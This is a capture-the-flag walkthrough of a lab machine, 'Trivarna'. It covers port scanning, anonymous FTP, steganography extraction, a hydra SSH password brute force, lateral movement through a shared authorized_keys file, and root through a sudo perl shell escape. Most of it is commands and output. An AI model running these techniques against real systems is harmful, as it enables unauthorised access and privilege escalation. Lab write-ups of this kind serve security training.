# **Trivarna - ThunderCipher**

*Target Ip. Address : 192.168.5.221*

So, let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 192.168.5.221

Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-04 15:33 +0545
Nmap scan report for 192.168.5.221 (192.168.5.221)
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.126
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)
|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)
|_  256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Trivarna
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.53 seconds
```

So, we have 3 ports and anonymous ftp to start with.
Login as anonymous, and we find a jpg file, download it so that we can analyze at our machine.

```bash
kali@kali:ftp 192.168.5.221                                                                                                                               
Connected to 192.168.5.221.                                                                                                                         
220 (vsFTPd 3.0.3)                                                                                                                                  
Name (192.168.5.221:kali): anonymous                                                                                                                
331 Please specify the password.                                                                                                                    
Password:                                                                                                                                           
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||57787|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
226 Directory send OK.
ftp> get trytofind.jpg
local: trytofind.jpg remote: trytofind.jpg
229 Entering Extended Passive Mode (|||47023|)
150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).
100% |*******************************************************************************************************|  1068 KiB    1.23 MiB/s    00:00 ETA
226 Transfer complete.
1093656 bytes received in 00:00 (1.11 MiB/s)
```

So, I tried exiftool, strings, steghide (it needs passphrase), thus will come back to it later.

Let's run gobuster, and see what we get.

```bash
kali@kali:gobuster dir -u http://192.168.5.221/ -w /usr/share/wordlists/dirb/big.txt 

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.221/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
blogs                (Status: 301) [Size: 314] [--> http://192.168.5.221/blogs/]
server-status        (Status: 403) [Size: 278]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```

Let's go to blogs and see what we have. 
So, "T0m-H4ck3r" has already comoromised this box and has left us a hint.

It is in source code of the page.

```hint
<!--the hint is the another secret directory is S3cr3t-T3xt-->
```

That directory has nothing, but again at the source code it has a secret key.

```hint
<!..Secret Key 3x.....t4 >
```

So, I guess this must be passphrase for the image file we have.
Let's extract it.

```bash
kali@kali:steghide --extract -sf trytofind.jpg 
Enter passphrase: 
wrote extracted data to "data.txt".
```

```bash
kali@kali:cat data.txt                                                                                                                                    
Hello.....  r..u

     I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

So, we have our first username, and there is hint of weak credentials, let's try hydra to bruteforce.

```bash
kali@kali:hydra -l r..u -P /usr/share/wordlists/rockyou.txt ssh://192.168.5.221
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-04 15:50:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.5.221:22/
[22][ssh] host: 192.168.5.221   login: r..u   password: 987..21
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-04 15:50:53
```

We get a valid set of credentials for ssh. Let's login via ssh.

```bash
kali@kali:ssh r..u@192.168.5.221
The authenticity of host '192.168.5.221 (192.168.5.221)' can't be established.
ED25519 key fingerprint is: SHA256:4skFgbTuZiVgZGtWwAh5WRXgKXTdP7U5BhYUsIg9nWw
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.5.221' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
r..u@192.168.5.221's password: 
Linux trivarna 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan 24 23:58:19 2026 from 192.168.5.126
r..u@trivarna:~$
```

We get our first flag in the home directory.

```bash
r..u@trivarna:~$ cat user1.txt
ThunderCipher{Tr1.....cX}
```

We find another user l..y, and in her directory we find our second flag.

```bash
r..u@trivarna:/home/l..y$ cat user2.txt
ThunderCipher{Ch.....dA}
```

Let's get and run linpeas to see if we find anything interesting.

```hint
-rw-r--r-- 1 l..y l..y 395 Jan 24 23:52 /home/l..y/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 r..u@trivarna
```

We have current user's (r..u) public key in the .ssh directory of another user (r..u). We can just escalate to another user using this, or traditionally you can also login using a private key, which is available in the .ssh directory of current user (r..u).

```bash
r..u@trivarna:~$ ssh l..y@127.0.0.1
Linux trivarna 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan 24 23:52:21 2026 from 127.0.0.1

l..y@trivarna:~$ 
```

Checking sudo privileges, we can run /usr/bin/perl as a root.

```bash
l..y@trivarna:~$ sudo -l
Matching Defaults entries for l..y on trivarna:
   env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User l..y may run the following commands on trivarna:
   (ALL : ALL) NOPASSWD: /usr/bin/perl
```

Time to be root.

```bash
l..y@trivarna:~$ sudo perl -e 'exec "/bin/sh"'
# id
uid=0(root) gid=0(root) groups=0(root)
```

And, now let's head to root directory, read the final flag and finish this challenge.

```bash
# cat root.txt
ThunderCipher{R0.....1E}
```
